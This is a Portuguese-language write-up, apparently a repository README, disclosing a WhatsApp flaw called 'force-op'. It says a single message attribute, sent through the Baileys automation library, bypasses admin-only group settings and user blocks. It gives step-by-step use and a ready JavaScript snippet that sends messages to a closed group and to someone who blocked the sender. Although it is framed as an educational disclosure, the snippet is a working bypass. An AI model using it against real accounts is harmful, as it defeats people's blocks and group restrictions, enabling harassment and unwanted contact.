# Falha "Force-Op" no WhatsApp

## Descrição

A falha chamada **"force-op"** foi detectada no WhatsApp e permite o envio de mensagens mesmo com restrições aplicadas. Essa vulnerabilidade afeta dois cenários principais:

1. **Grupos fechados para administradores:** 
   - Quando um grupo é configurado para permitir mensagens apenas de administradores, com essa falha, é possível enviar mensagens que aparecem para todos os membros do grupo.
   
2. **Usuários bloqueados:**
   - Mesmo quando um usuário bloqueia outro, o usuário bloqueado pode enviar mensagens e estas serão entregues normalmente à pessoa que o bloqueou.

## Detalhes Técnicos

Para explorar essa falha, é necessário adicionar o seguinte atributo à mensagem que será enviada:

```javascript
{ additionalAttributes: { edit: '7' } }
```

## Implementação

A exploração foi realizada utilizando a biblioteca [`@whiskeysockets/baileys`](https://github.com/WhiskeySockets/Baileys), que permite a automação de interações com o WhatsApp.

### Passos Executados

1. **Criação da Automação:**
   - Desenvolvi um script baseado na biblioteca `@whiskeysockets/baileys`.
   
2. **Identificação dos IDs:**
   - Usei o console do script para identificar:
     - O **ID do grupo fechado**.
     - O **ID do número que me bloqueou**.

3. **Envio de Mensagens:**
   - Adicionei os IDs na mensagem para direcionar o envio apenas para:
     - O grupo fechado.
     - O chat privado da pessoa que me bloqueou.
   - O envio foi realizado utilizando o atributo `additionalAttributes` mencionado anteriormente.

### Código de Exemplo

Aqui está um exemplo de como a mensagem foi configurada no script:

```javascript
const baileys = require('@whiskeysockets/baileys');

const sendMessage = async (connection, chatId, message) => {
    await connection.sendMessage(chatId, {
        text: message,
        additionalAttributes: {
            edit: '7',
        },
    });
};

// Envio de mensagem para o grupo fechado
sendMessage(connection, 'ID_DO_GRUPO', 'Mensagem para o grupo fechado');

// Envio de mensagem para um usuário que bloqueou
sendMessage(connection, 'ID_DO_USUÁRIO', 'Mensagem para o usuário que me bloqueou');
```

## Resultado

- Em **grupos fechados**, as mensagens foram entregues normalmente para todos os membros.
- Para **usuários que bloquearam**, as mensagens apareceram no chat do bloqueador como se fossem enviadas normalmente.

## Considerações

Essa falha pode causar problemas sérios relacionados à privacidade e ao controle de comunicação no WhatsApp. Recomenda-se que o WhatsApp investigue e corrija essa vulnerabilidade o mais rápido possível.

## Observação

Este documento foi criado apenas com fins educacionais e para alertar sobre a falha encontrada. **Não incentivamos o uso mal-intencionado desta vulnerabilidade.**
